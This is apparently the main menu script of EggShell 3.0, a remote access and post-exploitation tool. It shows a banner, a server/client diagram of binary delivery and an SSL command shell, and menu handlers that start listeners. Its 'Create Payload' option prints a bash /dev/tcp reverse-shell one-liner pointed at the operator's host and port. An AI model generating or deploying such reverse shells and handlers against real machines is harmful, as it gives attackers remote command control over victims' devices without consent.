#!/usr/bin/python
from modules import server as srv
from modules import helper as h
server = srv.Server()

#banner
banner_text = h.GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `"""+h.COLOR_INFO+"""
                    ,_  .--.
               , ,   _)\\/    ;--.
       . ' .    \\_\\-'   |  .'    \\
      -= * =-   (.-,   /  /       |
       ' .\\'    ).  ))/ .'   _/\\ /
           \\_   \\_  /( /     \\ /(
           /_\\ .--'   `-.    //  \\
           ||\\/        , '._//    |
           ||/ /`(_ (_,;`-._/     /
           \\_.'   )   /`\\       .'
                .' .  |  ;.   /`
               /      |\\(  `.(
              |   |/  | `    `
              |   |  /
              |   |.'
           __/'  /
       _ .'  _.-`
    _.` `.-;`/
   /_.-'` / /
         | /
        ( /
       /_/
"""+h.WHITE+"\nVersion: 3.0\nCreated By Lucas Jackson (@neoneggplant)\n"+h.ENDC +\
h.WHITE+"-"*40+"\n"+""" Menu:
    1): Start Server
    2): Start MultiHandler
    3): Create Payload
    4): Exit
"""+h.WHITE+"-"*40 + "\n"+h.NES

#How
help_text = h.RED+"""     |                            """+h.GREEN+"""             |
"""+h.RED+"""  ___|___                         """+h.GREEN+"""          ___|___
"""+h.RED+""" ////////\   _                    """+h.GREEN+"""     _   /\\\\\\\\\\\\\\\\
"""+h.RED+"""////////  \ ('<                   """+h.GREEN+"""    >') /  \\\\\\\\\\\\\\\\
"""+h.RED+"""| (_)  |  | (^)                   """+h.GREEN+"""    (^) |  | (_)  |
"""+h.RED+"""|______|.===="==                  """+h.GREEN+"""   =="====.|______|

"""+h.RED+"    SERVER                                  "+h.GREEN+"CLIENT"+h.WHITE+"""
                                     ->(EXPLOITATION?)
(Detect Device) """+h.COLOR_INFO+"<<<-------------------"+h.WHITE+""" (Shell Script)
(Send Binary)   """+h.COLOR_INFO+"------------------->>>"+h.WHITE+""" (execute binary)
(Command Shell) """+h.COLOR_INFO+"<<<-------SSL------>>>"+h.WHITE+""" (Run Commands)"""

# Actions

def start_single_server():
    if not server.set_host_port():
        return
    server.start_single_handler()


def start_multi_handler():
    if not server.set_host_port():
        return
    server.start_multi_handler()


def prompt_run_server():
    if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(h.NES+"MultiHandler? (y/N): ") == "y":
            server.start_multi_handler()
        else:
            server.start_single_handler()


def create_payload():
    if not server.set_host_port():
        return
    print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
    prompt_run_server()


def exit_menu():
    exit()


def menu(err=""):
    h.clear()
    if err:
        print err
    option = raw_input(banner_text)
    choose = {
        "1" : start_single_server,
        "2" : start_multi_handler,
        "3" : create_payload,
        "4" : exit_menu
    }
    try:
        choose[option]()
        menu()
    except KeyError:
      if option:
        menu("Oops: " + option + " is not an option")
      else:
        menu()


if __name__ == "__main__":
    try:
        h.generate_keys()
        menu()
    except KeyboardInterrupt:
        print "\nBye!"
        exit()
